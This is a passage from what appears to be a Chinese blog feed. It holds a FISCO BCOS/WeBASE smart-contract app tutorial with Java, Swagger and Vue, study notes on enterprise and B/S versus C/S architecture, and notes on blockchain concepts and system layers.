<li><p>添加合约内容，具体代码访问链接：<a href="https://gitee.com/zhiguxingtu/demo8-back/blob/master/src/main/contracts/StringGetSet.sol">https://gitee.com/zhiguxingtu/demo8-back/blob/master/src/main/contracts/StringGetSet.sol</a></p>
</li>
</ol>
<p><img src="https://s2.loli.net/2025/03/17/aU71QoP43pNICSn.png" alt="4.png"></p>
<p><img src="https://s2.loli.net/2025/03/17/vrbKi68aZcBQ3Cp.png" alt="5.png"></p>
<p><strong>二、创建用户、部署合约</strong></p>
<p><img src="https://s2.loli.net/2025/03/17/umA8SIV9E2MU5Qq.png" alt="6.png"></p>
<p><img src="https://s2.loli.net/2025/03/17/LEvkYIhU7aeuRlV.png" alt="7.png"></p>
<h4 id="搭建应用程序后端基本框架并配置"><a href="#搭建应用程序后端基本框架并配置" class="headerlink" title="搭建应用程序后端基本框架并配置"></a><strong>搭建应用程序后端基本框架并配置</strong></h4><p><strong>步骤如下：</strong></p>
<ol>
<li>WeBASE-Front项目导出</li>
</ol>
<p><img src="https://s2.loli.net/2025/03/17/I6RcPqakLE2pUWn.png" alt="9.png"></p>
<ol start="2">
<li>IDEA等编译工具项目导入</li>
</ol>
<ul>
<li><p>通过WeBASE-Front-&gt; 合约IDE导出“StringGetSet”项目，如左下图所示。</p>
</li>
<li><p>使用IDEA等开发软件导入StringGetSet项目，如右下图所示。</p>
</li>
<li><p>在开发软件中对项目进行相关配置。</p>
</li>
</ul>
<p><img src="https://s2.loli.net/2025/03/17/SYh8opEOPqVma7N.png" alt="10.png"></p>
<ol start="3">
<li>配置Swagger UI</li>
</ol>
<ul>
<li><p>配置build.gradle添加相关配置。</p>
</li>
<li><p>如下图所示，在Config包中添加Swagger配置代码SwaggerConfig.java，代码如链接：<a href="https://gitee.com/zhiguxingtu/demo8-back/blob/master/src/main/java/org/example/StringGetSet/config/SwaggerConfig.java">https://gitee.com/zhiguxingtu/demo8-back/blob/master/src/main/java/org/example/StringGetSet/config/SwaggerConfig.java</a></p>
</li>
</ul>
<p><img src="https://s2.loli.net/2025/03/17/mqeitWvMXaUIxyw.png" alt="8.png"></p>
<ol start="4">
<li>验证区块链功能</li>
</ol>
<p>使用Java SDK的方式调用智能合约</p>
<ul>
<li><p>创建controller包，并在controller包中添加StringGetSetController.java文件。</p>
</li>
<li><p>编写StringGetSetController.java对应代码。</p>
</li>
<li><p>启动项目，访问<a href="http://localhost:8080/swagger-ui.html%E6%9F%A5%E7%9C%8B%E5%B9%B6%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3%E3%80%82">http://localhost:8080/swagger-ui.html查看并使用接口。</a></p>
</li>
</ul>
<h4 id="开发基于WeBASE-Front-API的应用程序接口"><a href="#开发基于WeBASE-Front-API的应用程序接口" class="headerlink" title="开发基于WeBASE-Front API的应用程序接口"></a><strong>开发基于WeBASE-Front API的应用程序接口</strong></h4><p><strong>应用接口开发流程</strong></p>
<ol>
<li>添加接口开发相关依赖包文件</li>
<li>编写的WeBASEFront的Controller接口</li>
<li>开发基于WeBASE-Front的Service</li>
<li>验证开发接口的正确性</li>
</ol>
<hr>
<p><strong>添加hutools依赖包</strong></p>
<p>在build.gradle引入hutools依赖包，代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">implementation <span class="string">&#x27;cn.hutool:hutool-all:5.7.9&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2025/03/19/u3yaAeJw712UGgq.png" alt="11.png"></p>
<p><strong>编写WeBASE API服务</strong></p>
<p>需要以下三个步骤：</p>
<p>1、在service包中添加WeBASEService.java文件，以及在controller包中添加WeBASEController.java文件。</p>
<p>2、编写WeBASEService.java对应代码。</p>
<p>3、编写WeBASEController.java对应代码。</p>
<p><img src="https://s2.loli.net/2025/03/19/iltW8DKQmF7HrYg.png" alt="12.png"></p>
<p><strong>验证接口开发结果</strong></p>
<p>通过浏览器访问：<a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a></p>
<p><img src="https://s2.loli.net/2025/03/19/fa6czEYBOJuXMDt.png" alt="13.png"></p>
<p>1、使用newSet调用智能合约：</p>
<p>在WeBASE管理平台，复制一个测试用户的地址。在newSet调用接口中复制该用户地址，并填写对应的值，点击”Try it out！“ 。</p>
<p><img src="https://s2.loli.net/2025/03/19/sIZFay3OlgEfYH2.png" alt="14.png"></p>
<p>2、使用newGet方法验证：</p>
<p>用同样的方法打开newGet接口界面，并输入用户地址，点击”Try it out！“ 。</p>
<p><img src="https://s2.loli.net/2025/03/19/XJ7QIMkiBwftgAe.png" alt="16.png"></p>
<p><img src="https://s2.loli.net/2025/03/19/omZu3IMFranxEL8.png" alt="15.png"></p>
<p><strong>开发并验证智能合约查询接口</strong></p>
<p>基于Get和Set开发模式，编写Controller与Service：</p>
<ol>
<li><p>在service包中的WeBASEService添加listDeployedContract函数，函数调用WeBASE API的合约查看接口（）</p>
</li>
<li><p>在controller中的WeBASEController中添加list接口</p>
</li>
<li><p>访问<a href="http://localhost:8080/swagger-ui.html%E9%AA%8C%E8%AF%81">http://localhost:8080/swagger-ui.html验证</a></p>
</li>
<li><p>打开接口直接点击“Try it out！” ，查看返回会有所有合约对应地址内容</p>
</li>
</ol>
<p><img src="https://s2.loli.net/2025/03/19/OwEZWNzytLmSAru.png" alt="17.png"></p>
<p><img src="https://s2.loli.net/2025/03/19/BN78jAns9iw2IGb.png" alt="18.png"></p>
<h3 id="应用程序前端开发流程"><a href="#应用程序前端开发流程" class="headerlink" title="应用程序前端开发流程"></a><strong>应用程序前端开发流程</strong></h3><h4 id="下载模板并安装依赖"><a href="#下载模板并安装依赖" class="headerlink" title="下载模板并安装依赖"></a><strong>下载模板并安装依赖</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/fisco/front-project</span><br><span class="line"><span class="built_in">cd</span> ~/fisco/front-project</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span></span><br><span class="line">https://gitee.com/zhiguxingtu/init-front.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> -r init-front demo8</span><br><span class="line"><span class="built_in">cd</span> demo8</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<h4 id="开发应用程序前端页面"><a href="#开发应用程序前端页面" class="headerlink" title="开发应用程序前端页面"></a><strong>开发应用程序前端页面</strong></h4><ol>
<li><p>添加导航功能，创建components文件夹，在文件夹中创建Navigator.vue，编写相关代码。</p>
</li>
<li><p>修改主页功能的views&#x2F;Home.vue相关代码。</p>
</li>
<li><p>添加其他应用功能在views目录下创建SDK.vue和WeBASE.vue文件，并编写页面显示代码</p>
</li>
<li><p>修改路由跳转文件router.js代码。代码地址：<a href="https://gitee.com/zhiguxingtu/demo8-front">https://gitee.com/zhiguxingtu/demo8-front</a></p>
</li>
</ol>
<h4 id="验证应用程序前端开发"><a href="#验证应用程序前端开发" class="headerlink" title="验证应用程序前端开发"></a><strong>验证应用程序前端开发</strong></h4><p>1、使用命令启动：</p>
<p>• cd ~&#x2F;fisco&#x2F;front-project&#x2F;demo8</p>
<p>• npm run serve</p>
<p>2、访问：<a href="http://localhost:8020/#/home%EF%BC%9A">http://localhost:8020/#/home：</a></p>
<p>【19】</p>
<p>3、访问导航栏的“Java SDK”和“WeBASE”功能：</p>
<p><img src="https://s2.loli.net/2025/03/19/N1EkzSnv6gqaPpV.png" alt="20.png"></p>
<p><img src="https://s2.loli.net/2025/03/19/NWJUZF53pHmDcg2.png" alt="21.png"></p>
<hr>
<p>实践尝试</p>
<p>参照StringGetSet智能合约调用功能的页面布局，搭建MyGetSet智能合约的页面</p>
<p>布局。包括内容：</p>
<p>（1）Home页面开发</p>
<p>（2）Java SDK和WeBASE页面开发</p>
<p>（3）导航栏navigator开发</p>
<p>（4）路由router.js的开发</p>
<hr>
<h3 id="开发应用程序前端对应交互功能"><a href="#开发应用程序前端对应交互功能" class="headerlink" title="开发应用程序前端对应交互功能"></a><strong>开发应用程序前端对应交互功能</strong></h3><h4 id="编写智能合约交互功能"><a href="#编写智能合约交互功能" class="headerlink" title="编写智能合约交互功能"></a>编写智能合约交互功能</h4><p>1、修改SDK.vue代码，添加Javascript调用后端代码，在<code>&lt;script&gt;</code>标签中添加methods，修改<code>&lt;template&gt;</code>标签中的内容。</p>
<p>2、修改WeBASE.vue代码，添加Javascript调用后端代码，在<code>&lt;script&gt;</code>标签中添加methods，修改<code>&lt;template&gt;</code>标签中的内容。</p>
<p><img src="https://s2.loli.net/2025/03/19/FBc6sgfvZuOwM1Y.png" alt="22.png"></p>
<h4 id="验证开发情况"><a href="#验证开发情况" class="headerlink" title="验证开发情况"></a>验证开发情况</h4><ol>
<li><strong>验证Java SDK智能合约调用情况</strong></li>
</ol>
<p>（1）进入Java SDK导航，在“Set方法”的输入框输入“你好！” ，有如下返回：</p>
<p><img src="https://s2.loli.net/2025/03/19/zYIFjMsNGLblCOv.png" alt="23.png"></p>
<ol start="2">
<li><strong>验证Java SDK智能合约调用情况</strong></li>
</ol>
<p>（2）进入Java SDK导航，在“Get方法”调用“调用” ，有如下返回：</p>
<p><img src="https://s2.loli.net/2025/03/19/L2sSI7FkU39OzNK.png" alt="24.png"></p>
<ol start="3">
<li><strong>验证WeBASE-Front API智能合约调用情况</strong></li>
</ol>
<p>（1）进入WeBASE导航，在“账户地址”输入“test_user_1”的地址，模拟Java SDK的Get方法调用方法。</p>
<p>验证基于WeBASE Front的智能合约交互功能示例：</p>
<p><img src="https://s2.loli.net/2025/03/19/tvG2OEui7Alm8NH.png" alt="25.png"></p>
<h4 id="开发功能：获取所有智能合约并测试"><a href="#开发功能：获取所有智能合约并测试" class="headerlink" title="开发功能：获取所有智能合约并测试"></a>开发功能：获取所有智能合约并测试</h4><ol>
<li><p>修改Home.vue，添加获取列出所有智能合约的方法。</p>
</li>
<li><p>通过页面验证。</p>
</li>
</ol>
<p><img src="https://s2.loli.net/2025/03/19/z71YfyKCQbjIopV.png" alt="26.png"></p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>关于架构</title>
    <url>/2025/01/10/%E5%85%B3%E4%BA%8E%E6%9E%B6%E6%9E%84/</url>
    <content><![CDATA[<h2 id="企业架构"><a href="#企业架构" class="headerlink" title="企业架构"></a>企业架构</h2><p>  企业架构是企业进行项目决策的重要依据，同时也是支撑企业后续发展的重要基石。<strong>业务架构、数据架构、应用架构和技术架构是企业架构中的四个主要架构</strong>，它们在关注的方面和功能上有所不同，但是它们是相互关联和相互支持的，共同构成了企业的总体架构。</p>
<h3 id="企业架构之4A架构"><a href="#企业架构之4A架构" class="headerlink" title="企业架构之4A架构"></a><strong>企业架构之4A架构</strong></h3><p><strong>4A架构关键词：</strong></p>
<p><strong>业务架构：</strong>战略，价值链，端到端，业务流程，业务组件，自上而下分解</p>
<p><strong>应用架构</strong>：系统建设，系统集成，中台，自下而上抽象</p>
<p><strong>技术架构</strong>：技术选型，框架，PaaS平台，云原生，DevOps，微服务，容器化，部署架构</p>
<p><strong>数据架构：</strong>数据标准，数据采集加工，数据入湖，数据治理，数据共享服务，数据安全，数据质量，数据架构</p>
<p>【1】</p>
<h4 id="业务结构"><a href="#业务结构" class="headerlink" title="业务结构"></a>业务结构</h4><p>业务架构定义了业务策略、治理、组织和关键业务过程。是企业架构的核心内容，承接了企业战略，直接决定企业战略的实现能力，是其他架构领域工作的前置条件。</p>
<p>主要目标是根据企业战略愿景，分析业务现状，识别现有业务能力及问题，提出业务改进需求，设计目标业务架构。（以价值链梳理分析业务开展流程，识别上下游依赖关系，从业务和产品的视角，描述整个平台或者产品的实现）</p>
<p><strong>设计步骤：</strong></p>
<ul>
<li>识别战略，走访业务部门，问卷调查</li>
<li>外部因素，根据宏观背景（风口），行业空间（天花板），竞争情况（赛道），上下游产业链做规划</li>
<li>内部因素，根据商业模式，技术壁垒和资源投入进行规划</li>
</ul>
<p><strong>如何绘制业务架构图</strong></p>
<p>A）根据用户操作流程，罗列功能模块</p>
<p>B）形成功能矩阵</p>
<p>C）横向分层，纵向分层</p>
<h4 id="应用架构"><a href="#应用架构" class="headerlink" title="应用架构"></a><strong>应用架构</strong></h4><p>应用架构为要部署的单个应用系统、它们之间的交互和它们与组织的核心业务流程之间的关系提供蓝图。</p>
<p>工作主要目标是根据企业现状应用架构需求及业务架构中的数据流分析结果，设计目标应用架构（支持业务和数据处理需要哪些应用系统，完成从业务到IT的转换）</p>
<p><strong>设计步骤：</strong></p>
<ul>
<li>根据业务架构图，做业务到IT的转换，识别应用程序和组件 （上接业务）</li>
<li>优化应用程序和组件，该拆分就拆分，该聚合就聚合 （核心设计）</li>
<li>设计应用与业务功能，流程，数据的关系（核心设计）</li>
<li>设计应用集成，交互，开发 （下接开发）</li>
</ul>
<h4 id="技术架构"><a href="#技术架构" class="headerlink" title="技术架构"></a>技术架构</h4><p>技术架构描述了需要支持业务、数据和应用服务的部署的逻辑软硬件能力，包括IT基础设施、中间件、网络、通信、流程、标准等。</p>
<p>工作主要目标是基于现状技术架构、技术标准、业务&#x2F;应用&#x2F;数据架构要求，设计目标技术架构。梳理AS-IS技术架构，形成平台分解图和技术谱系目录。（支持应用系统所需的技术架构，技术组件，技术选型）</p>
<p><strong>设计步骤：</strong></p>
<ul>
<li>根据应用架构，进行技术支撑分析，识别技术支撑的必要条件</li>
<li>技术选型，包括开发架构，技术产品，开发技术栈，开发平台，运行平台</li>
<li>技术影响分析，成本，难易度，规划，治理</li>
</ul>
<h4 id="数据架构"><a href="#数据架构" class="headerlink" title="数据架构"></a>数据架构</h4><p>数据架构描述了企业逻辑物理数据资产和数据管理资源的结构。</p>
<p>工作主要目标是根据企业现状数据架构需求及业务架构中的数据流转，设计目标数据架构。（描述企业数据来源，数据资产管理，数据治理，数据共享开放）</p>
<p><strong>设计步骤：</strong></p>
<ul>
<li>上接业务，分析数据需求，识别数据类型，采集数据</li>
<li>数据模型设计，概念模型（识别业务域），逻辑模型（实体关系ER），物理模型（表字段）</li>
<li>数据治理，数据安全合规，数据质量管理</li>
<li>数据共享开放，支撑业务决策，业务创新</li>
<li>分析：根据数据应用层、数据接口层、数据层、数据采集层、数据源。</li>
</ul>
<h2 id="B-S架构"><a href="#B-S架构" class="headerlink" title="B&#x2F;S架构"></a>B&#x2F;S架构</h2><p><strong>定义：</strong></p>
<p><strong>即 Browser&#x2F;Server（浏览器 &#x2F; 服务器）架构，是一种网络应用程序架构模式</strong>。（一种基于Web的系统架构，用户通过<strong>浏览器</strong>访问应用程序）</p>
<p><strong>特点：</strong></p>
<ul>
<li><strong>客户端轻量化：</strong> 用户不需要安装任何特定的客户端软件，只需使用标准的Web浏览器即可。</li>
<li><strong>易于部署和维护：</strong> 所有更新和维护工作都集中在服务器端进行，无需在每个客户端上操作。</li>
<li><strong>跨平台性：</strong> 只要有Web浏览器和网络连接，就可以从任何设备访问应用。</li>
</ul>
<h3 id="架构组成"><a href="#架构组成" class="headerlink" title="架构组成"></a>架构组成</h3><p><strong>客户端（浏览器）</strong><br>用户通过浏览器（如 Chrome、Firefox、Internet Explorer 等）来访问应用程序。浏览器负责向服务器发送请求，并接收和展示服务器返回的数据。这种方式无需在客户端安装专门的软件，只要有浏览器和网络连接，用户就可以随时随地访问应用。<br><strong>服务器端</strong><br>    1. <strong>Web 服务器</strong>：主要负责处理浏览器发来的 HTTP 请求，常见的 Web 服务器有 Apache、Nginx 等。它接收请求后，会根据请求的内容将相应的网页文件发送回浏览器，或者将请求转发给应用服务器处理。<br>    2. <strong>应用服务器</strong>：运行应用程序的业务逻辑。例如，处理用户登录验证、数据查询与处理、业务规则的执行等。常见的应用服务器有 Tomcat（主要用于 Java 应用）、IIS（用于ASP.NET应用）等。<br>    3. <strong>数据库服务器</strong>：用于存储应用程序的数据。它接收来自应用服务器的数据操作请求（如查询、插入、更新、删除等），并对数据库中的数据进行相应的操作。</p>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol>
<li>用户在浏览器中输入应用程序的 URL 地址，浏览器向 Web 服务器发送 HTTP 请求。</li>
<li>Web 服务器收到请求后，如果是静态网页请求（如 HTML、CSS、JavaScript 文件等），则直接将相应的文件返回给浏览器；如果是动态网页请求（如涉及到数据查询、业务逻辑处理等），则将请求转发给应用服务器。</li>
<li>应用服务器处理业务逻辑，可能会与数据库服务器交互（查询数据、存储数据等），然后将处理结果生成动态网页内容返回给 Web 服务器。</li>
<li>Web 服务器将应用服务器返回的内容发送回浏览器，浏览器对收到的内容进行解析和渲染，展示给用户。</li>
</ol>
<h2 id="C-S架构"><a href="#C-S架构" class="headerlink" title="C&#x2F;S架构"></a><strong>C&#x2F;S架构</strong></h2><p><strong>定义：</strong></p>
<ul>
<li>C&#x2F;S 架构，即 Client&#x2F;Server（客户端 &#x2F; 服务器）架构，是一种常见的软件架构模式。C&#x2F;S 架构是一种传统的分布式应用架构，它将应用程序分为客户端和服务器端两部分。</li>
<li>客户端负责用户交互界面和一部分业务逻辑，服务器端则主要负责数据管理和核心业务逻辑。</li>
</ul>
<p><strong>特点</strong>：</p>
<ul>
<li><strong>功能丰富：</strong> 由于客户端可以安装专用的应用程序，因此可以提供更丰富的用户体验和功能。</li>
<li><strong>性能优势：</strong> 客户端可以利用本地计算资源进行一些计算密集型任务，减轻服务器压力。</li>
<li><strong>安全性：</strong> 相对于B&#x2F;S架构，C&#x2F;S架构可以通过客户端应用程序更好地控制数据安全。</li>
<li><strong>部署复杂度：</strong> 需要在每个客户端机器上安装、配置和更新软件，增加了维护成本。</li>
</ul>
<h3 id="架构组成-1"><a href="#架构组成-1" class="headerlink" title="架构组成"></a>架构组成</h3><p><strong>客户端（Client）</strong></p>
<p>客户端是安装在用户终端设备（如个人计算机、移动设备）上的软件。它主要负责向服务器发送请求、接收服务器返回的数据并进行展示和处理。例如，在一款银行客户端软件中，用户通过客户端界面输入账户查询、转账等操作指令，这些指令会被打包成请求发送给服务器。客户端软件通常具有良好的用户界面，能够根据用户操作和服务器返回的数据进行交互展示。</p>
<p><strong>服务器（Server）</strong></p>
<ol>
<li><p><strong>业务逻辑处理服务器</strong>：负责处理客户端发送过来的请求。</p>
<p>它会根据应用程序的业务规则对请求进行分析和处理。[例如，在一个物流管理系统中，当客户端发送货物运输状态查询请求时，业务逻辑处理服务器会根据存储的物流数据（如货物的发货时间、运输路线、预计到达时间等）进行计算和判断，然后生成相应的结果。]</p>
</li>
</ol>
<hr>
<ol start="2">
<li><p><strong>数据存储服务器：</strong>主要用于存储应用程序所涉及的各种数据。这些数据包括用户信息、业务数据等。</p>
<p>以电商平台为例，数据存储服务器存储了海量的商品信息（如商品名称、价格、库存等）、用户账户信息（如用户名、密码、收货地址等）和订单信息（如订单编号、下单时间、支付状态等）。它通过数据库管理系统来组织和管理这些数据，以便高效地响应服务器的查询和更新请求。</p>
</li>
</ol>
<h3 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h3><ol>
<li><p><strong>用户通过客户端软件发起操作请求</strong>，例如在一个企业资源规划（ERP）客户端软件中，用户点击查询库存的按钮，<strong>客户端会将</strong>包含库存查询指令的<strong>请求发送给服务器。</strong></p>
</li>
<li><p><strong>服务器收到请求后，业务逻辑处理服务器会根据请求的类型和具体内容进行处理。</strong>如果是库存查询请求，它会与数据存储服务器进行交互，从数据库中检索相关的库存数据。</p>
</li>
<li><p><strong>业务逻辑处理服务器将从数据存储服务器获取的数据进行处理和整合，生成客户端所需的结果。</strong>例如，将库存数据进行格式化，使其符合客户端软件的展示要求。</p>
</li>
<li><p><strong>服务器将处理后的结果返回给客户端，客户端接收到结果后，在软件界面上进行展示。</strong>如在库存查询的例子中，客户端会将收到的库存数量、产品名称等信息以表格或其他直观的形式显示在界面上，供用户查看。</p>
</li>
</ol>
<h2 id="简述C-S架构和B-S架构的区别"><a href="#简述C-S架构和B-S架构的区别" class="headerlink" title="简述C&#x2F;S架构和B&#x2F;S架构的区别"></a>简述C&#x2F;S架构和B&#x2F;S架构的区别</h2><h3 id="联系："><a href="#联系：" class="headerlink" title="联系："></a>联系：</h3><ul>
<li><p>都属于客户端-服务器架构：无论是B&#x2F;S还是C&#x2F;S架构，其核心都是将应用分为客户端和服务端两部分，客户端负责用户交互，服务端负责数据处理和存储。</p>
</li>
<li><p>都需要网络连接：两种架构都需要通过网络来实现客户端与服务器之间的通信。</p>
</li>
<li><p>都可以支持多用户访问：这两种架构都能够支持多个客户端同时连接到服务器上进行操作。</p>
</li>
</ul>
<h3 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h3><p><strong>客户端形式不同：</strong></p>
<p>B&#x2F;S架构的客户端是浏览器，用户通过浏览器直接访问Web应用程序。<br>C&#x2F;S架构的客户端是一个独立的应用程序，需要预先安装在用户的计算机上。</p>
<p><strong>维护成本不同</strong>：</p>
<ul>
<li><p>B&#x2F;S架构由于客户端统一为浏览器，因此维护相对简单，只需更新服务器端的应用程序即可。<strong>维护成本相对较低。</strong>例如，一个在线办公网站更新了文档编辑功能，用户再次通过浏览器访问时就能体验到新功能。</p>
</li>
<li><p>C&#x2F;S架构可能需要在每个客户端机器上进行软件升级或维护工作，这增加了维护的成本和复杂度。<strong>维护成本较高。</strong>例如，如果企业使用的一款 C&#x2F;S 架构的财务软件需要更新功能，IT 人员需要逐一到每台装有该软件的计算机上去安装更新包。</p>
</li>
</ul>
<p><strong>性能差异</strong>：</p>
<ul>
<li><p>B&#x2F;S架构依赖于浏览器的能力，对于复杂的业务逻辑和大量的数据处理可能不如C&#x2F;S架构高效。例如，一些 C&#x2F;S 架构的设计软件，在本地客户端上可以快速进行图形渲染等操作。</p>
</li>
<li><p>C&#x2F;S架构可以利用客户端的计算能力，适合处理大量数据和复杂的图形界面，提供更好的用户体验。例如，一些 C&#x2F;S 架构的设计软件，在本地客户端上可以快速进行图形渲染等操作。</p>
</li>
</ul>
<p><strong>安全性差异</strong>：</p>
<ul>
<li><p>B&#x2F;S架构中，所有数据和逻辑都在服务器端运行，这通常被认为更安全，因为不需要担心客户端上的数据泄露。但由于是通过浏览器访问，容易受到网络攻击，如跨站脚本攻击（XSS）、SQL 注入等，安全性保障相对复杂，需要采取多种网络安全措施来保护服务器和数据。例如，电商网站需要不断加强安全防护措施来防止用户信息泄露。</p>
</li>
<li><p>C&#x2F;S架构可能面临客户端的安全问题，比如客户端软件被恶意篡改等风险。例如，企业内部的 C&#x2F;S 架构管理系统，可以通过设置严格的用户认证和权限管理机制来保障数据安全。</p>
</li>
</ul>
<p><strong>可扩展性</strong>：</p>
<p>B&#x2F;S架构更容易扩展，因为它只需要更新服务器端，而不需要对客户端进行任何修改。<br>C&#x2F;S架构扩展时可能需要更新客户端软件，这可能会导致一定的延迟。</p>
<p><strong>平台兼容性</strong>：</p>
<ul>
<li><p><strong>B&#x2F;S架构通常具有更好的跨平台兼容性</strong>，因为大多数浏览器都能运行标准的Web技术栈（如HTML、CSS、JavaScript）。例如，用户可以在任何操作系统的浏览器上访问同一个在线学习网站。</p>
</li>
<li><p><strong>C&#x2F;S架构可能需要针对不同的操作系统开发不同的客户端版本。</strong>例如，一个 C&#x2F;S 架构的游戏软件，若要在 Windows 和 Mac 系统上都能使用，开发团队可能需要分别为这两个操作系统开发对应的客户端版本。</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链原理——区块链概念</title>
    <url>/2024/11/18/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86%E2%80%94%E2%80%94%E5%8C%BA%E5%9D%97%E9%93%BE%E6%A6%82%E5%BF%B5/</url>
    <content><![CDATA[<h2 id="区块链的基本概念"><a href="#区块链的基本概念" class="headerlink" title="区块链的基本概念"></a><strong>区块链的基本概念</strong></h2><h3 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h3><ul>
<li><p><strong>从字面上理解</strong>，区块链就是由多个记录数据的区块构成的链式数据结构。</p>
</li>
<li><p><strong>从技术角度来看</strong>，区块链是一种基于P2P网络架构的分布式账本技术系统：</p>
</li>
</ul>
<ol>
<li><strong>以“块-链”式数据结构来验证与存储账本数据</strong></li>
<li><strong>使用密码学方法保证数据传输和访问的安全</strong></li>
</ol>
<ul>
<li><strong>从应用角度来看</strong>，区块链是一种新型的无中介陌生人信任服务应用支撑平台系统。</li>
</ul>
<ol>
<li><strong>面向由陌生主体构成的开放网络环境</strong></li>
<li><strong>提供分布式账本记账服务</strong></li>
</ol>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
<li><strong>去&#x2F;弱中心化</strong></li>
<li><strong>可溯源</strong></li>
<li><strong>不可篡改</strong></li>
<li>数字价值唯一性（采用<strong>共识机制和密码学方法</strong>实现）</li>
<li>智能合约</li>
<li>开放性</li>
<li>去信任</li>
</ul>
<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p><img src="https://s2.loli.net/2024/11/18/4ipaLYJ9kvxXzQE.png" alt="1.png"></p>
<h4 id="公有链"><a href="#公有链" class="headerlink" title="公有链"></a>公有链</h4><ul>
<li><strong>公有链（Public Blockchain），任何人（任何个体与组织）都可以参与区块链数据的维护和读取，数据完全开放透明，免费开放</strong></li>
<li><strong>目前全球最有影响力的公有链是比特币和以太坊系统。</strong></li>
</ul>
<h4 id="联盟链"><a href="#联盟链" class="headerlink" title="联盟链"></a><strong>联盟链</strong></h4><ul>
<li><strong>联盟链（Consortium Blockchain），联盟链即区块链共识建立的范围及公共账本的公开对象为有限主体，如行业联盟成员之间，联盟成员平等参与区块链网络构建、公共账本创建与维护。</strong></li>
<li><strong>联盟链系统一般都需要严格的身份认证和权限管理，节点的数量在一定时间段内也是确定的，适合处理组织间需要达成共识的业务，身份验证是联盟链与公有链最大区别</strong></li>
<li><strong>区块链典型的联盟链代表技术是开源的超级账本系统（Hyperledger Fabric）</strong></li>
</ul>
<h4 id="私有链"><a href="#私有链" class="headerlink" title="私有链"></a>私有链</h4><ul>
<li><strong>私有链（Private Blockchain）即区块链共识建立的范围及公共账本的公开对象为单一主体，单一主体对区块链的网络运行及数据处理、交换与存储具有全部权利</strong></li>
<li><strong>私有链通常具备完善的权限管理体系，要求使用者提交身份认证。</strong></li>
<li>​    <strong>私有链也可以看作是联盟链的一种特殊形态，即联盟中只有一个成员</strong></li>
</ul>
<h3 id="历程"><a href="#历程" class="headerlink" title="历程"></a>历程</h3><p><img src="https://s2.loli.net/2024/11/18/uy1IlHtoaj7YBqz.png" alt="3.png"></p>
<h2 id="区块链系统总体架构"><a href="#区块链系统总体架构" class="headerlink" title="区块链系统总体架构"></a>区块链系统总体架构</h2><p><strong>在体系结构上没有采用传统具有中心化服务器节点的C&#x2F;S或B&#x2F;S架构，而是采用无中心化节点的P2P体系结构</strong>（<strong>每个存储区块链与账本数据的网络节点都是对等关系</strong>）</p>
<h3 id="系统逻辑架构"><a href="#系统逻辑架构" class="headerlink" title="系统逻辑架构"></a>系统逻辑架构</h3><p><img src="https://s2.loli.net/2024/11/18/iWlHQLKJU6TSgdM.png" alt="4.png"></p>
<h4 id="存储层"><a href="#存储层" class="headerlink" title="存储层"></a><strong>存储层</strong></h4><ul>
<li>存储层为区块链系统相关的区块链、分布式账本、智能合约、X.509数字证书、日志、配置文件等数据提供高效、可靠持久化存储服务</li>
<li>区块链系统一般采用的底层数据存储机制包括Key-Value数据库和文件系统。</li>
</ul>
<h4 id="数据层"><a href="#数据层" class="headerlink" title="数据层"></a>数据层</h4><ul>
<li>数据层是区块链系统的核心功能层级之一，负责定义区块链系统相关的区块、区块链、交易、账本、账户、地址等关键数据结构</li>
<li>并基于底层的存储服务提供对区块链数据的安全读写访问管理</li>
</ul>
<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><ul>
<li>网络层是区块链系统的核心功能层级之一，负责定义区块链系统相关的P2P网络模型与通信协议</li>
<li>为区块链系统各网络节点之间提供节点发现与安全连接通信机制</li>
<li>为交易、区块信息在区块链网络所有节点之间提供高效传播与有效性验证机制</li>
</ul>
<h4 id="共识层"><a href="#共识层" class="headerlink" title="共识层"></a><strong>共识层</strong></h4><ul>
<li>共识层是区块链系统的核心功能层级之一，为区块链系统提供一种或多种可选的公平、高效、安全、可靠的共识算法机制</li>
<li>让所有的区块链网络节点都认可每次计算产生的新区块，并且协调保证所有区块链网络节点数据记录一致性，使区块链系统的整体状态达成一致</li>
</ul>
<h4 id="激励层"><a href="#激励层" class="headerlink" title="激励层"></a><strong>激励层</strong></h4><ul>
<li>激励层是区块链系统可选的功能层级，以比特币、以太坊为代表的区块链系统，在共识层的功能基础上，提供了奖励加密货币的激励机制</li>
<li>对于加入区块链网络的节点，都有一定机率在区块链状态改变（如产生新区块、部署智能合约、智能合约被调用等）时被区块链系统增发奖励一定数量的加密货币</li>
<li>但是，以超级账本为代表的联盟链系统更多用于解决联盟内跨组织的信任服务问题，不需要类似奖励加密货币的激励机制。</li>
</ul>
<h4 id="合约层"><a href="#合约层" class="headerlink" title="合约层"></a>合约层</h4><ul>
<li><p>合约层是区块链系统的核心功能层级之一，智能合约是将基于区块链的应用系统业务逻辑以可编程脚本或高级语言代码的形式开发后，由区块链系统的合约层负责对智能合约代码进行动态部署运行，并由系统根据既定规则的条件触发和自动执行，智能合约的源代码、调用过程与执行结果都会被记录到区块链上，杜绝合约篡改和抵赖。</p>
</li>
<li><p>智能合约机制使区块链从最初单一的加密货币应用，延伸到政务服务、金融服务、征信管理、供应链管理、物联网等多个应用领域</p>
